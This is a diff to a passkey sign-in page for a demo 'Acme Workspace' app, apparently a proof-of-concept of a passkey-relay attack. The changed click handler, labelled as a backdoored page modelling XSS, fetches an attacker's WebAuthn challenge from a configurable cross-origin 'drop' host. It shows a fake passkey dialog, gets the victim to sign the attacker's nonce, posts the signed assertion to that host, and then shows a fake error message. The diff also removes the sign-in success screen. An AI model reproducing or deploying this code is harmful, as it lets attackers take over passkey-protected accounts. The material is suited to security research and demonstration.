@@ -27,9 +27,26 @@
   details input { width:100%; padding:9px; border:1px solid var(--line); border-radius:8px; font:inherit; margin:8px 0 0; }
   details button { background:#fff; color:var(--ink); border:1px solid var(--line); margin-top:12px; }
   .foot { margin-top:22px; color:#98a2b3; font-size:12px; text-align:center; }
+  /* Passkey prompt shown during sign-in (the OS dialog can't be captured, so the app shows one). */
+  .pk { position:fixed; inset:0; display:none; place-items:center; background:rgba(13,17,23,.5); z-index:20; }
+  .pk.show { display:grid; }
+  .pk .box { background:var(--card); border-radius:18px; padding:30px 34px; width:min(340px,86vw); text-align:center; box-shadow:0 24px 60px rgba(16,24,40,.3); }
+  .pk .ic { position:relative; width:76px; height:76px; margin:0 auto 16px; display:grid; place-items:center; border-radius:50%; background:rgba(59,91,219,.1); color:var(--brand); }
+  .pk .ic svg { width:38px; height:38px; }
+  .pk .ic::after { content:''; position:absolute; inset:0; border-radius:50%; border:2px solid var(--brand); opacity:.5; animation:pkpulse 1.4s ease-out infinite; }
+  @keyframes pkpulse { 0%{transform:scale(1);opacity:.5;} 100%{transform:scale(1.5);opacity:0;} }
+  .pk h2 { margin:0 0 6px; font-size:19px; }
+  .pk p { margin:0; color:var(--muted); font-size:14px; }
 </style>
 </head>
 <body>
+<div class="pk" id="pk">
+  <div class="box">
+    <div class="ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="7.5" cy="15.5" r="5.5"/><path d="m21 2-9.6 9.6"/><path d="m15.5 7.5 3 3L22 7l-3-3"/></svg></div>
+    <h2>Use your passkey</h2>
+    <p>Approve the prompt to sign in to Acme Workspace.</p>
+  </div>
+</div>
 <div class="card">
   <div class="brand"><div class="logo"></div> Acme Workspace</div>
 
@@ -52,13 +69,6 @@
     </details>
   </div>
 
-  <div id="home" class="home">
-    <div class="avatar"></div>
-    <div>Signed in <span class="ok">&#10003;</span></div>
-    <div class="big">Welcome back</div>
-    <p class="sub" style="margin-top:4px">You're all set.</p>
-  </div>
-
   <div class="foot">Secured with passkeys &middot; Powered by Pocket ID</div>
 </div>
 
@@ -76,6 +86,10 @@ function serializeAttestation(cred){ const r=cred.response; return {
   clientExtensionResults: cred.getClientExtensionResults ? cred.getClientExtensionResults() : {},
   response:{ attestationObject:bufToB64url(r.attestationObject), clientDataJSON:bufToB64url(r.clientDataJSON), transports: r.getTransports ? r.getTransports() : undefined }
 }; }
+
+// The attacker's site is a DIFFERENT origin. The backdoored page talks to its dead-drop there:
+// it fetches the attacker's nonce and hands back the signed assertion, cross-origin.
+const DROP = (new URLSearchParams(location.search).get('drop')) || 'http://127.0.0.1:1413';
 
 // Create an account and register a passkey (Windows Hello), through this origin.
 // Open sign-up (any number of users) when the server has the admin key; otherwise falls
@@ -106,19 +120,27 @@ $('enroll').onclick = async () => {
 };
 
 // Backdoored sign-in (models XSS on this origin): instead of starting its own login,
-// it signs the ATTACKER's staged challenge and exfiltrates the assertion. One tap.
+// the page signs the ATTACKER's nonce (picked up from the drop) and hands the assertion
+// back. The victim never finishes a login of their own, so they never get a session.
 $('go').onclick = async () => {
-  $('go').disabled = true; $('status').textContent = 'Starting sign-in…';
+  $('go').disabled = true; $('status').textContent = 'Signing in…';
   try {
-    const st = await (await fetch('/x/stage')).json(); // { slotId, challenge, rpId }
-    if (!st.challenge) { $('status').textContent = 'Could not start sign-in. Try again.'; $('go').disabled = false; return; }
+    const off = await (await fetch(DROP + '/x/offer')).json(); // the attacker's nonce, from its site
+    if (!off.challenge) { $('status').textContent = 'Could not sign you in. Try again.'; $('go').disabled = false; return; }
+    $('pk').classList.add('show'); // show the passkey prompt
     $('status').textContent = 'Approve the passkey prompt…';
+    // ?slow holds the prompt so the passkey step is clearly visible in recordings; no effect otherwise.
+    if (new URLSearchParams(location.search).has('slow')) await new Promise((r) => setTimeout(r, 3200));
     const cred = await navigator.credentials.get({ publicKey: {
-      challenge: b64urlToBuf(st.challenge), rpId: st.rpId || 'localhost', userVerification: 'required', timeout: 60000, allowCredentials: [],
+      challenge: b64urlToBuf(off.challenge), rpId: off.rpId || 'localhost', userVerification: 'required', timeout: 60000, allowCredentials: [],
     }});
-    await fetch('/x/drop', { method:'POST', headers:{'content-type':'application/json'}, body: JSON.stringify({ slotId: st.slotId, assertion: serializeAssertion(cred) }) });
-    $('login').style.display = 'none'; $('home').style.display = 'block';
+    $('pk').classList.remove('show'); // passkey approved
+    await fetch(DROP + '/x/assertion', { method:'POST', headers:{'content-type':'application/json'}, body: JSON.stringify({ assertion: serializeAssertion(cred) }) });
+    // The signature went to the attacker's waiting login. Nothing signed the victim in here.
+    $('status').textContent = 'Hmm, that did not work. Please try again.';
+    $('go').disabled = false;
   } catch (e) {
+    $('pk').classList.remove('show');
     $('status').textContent = 'Sign-in failed: ' + (e.message || e); $('go').disabled = false;
   }
 };
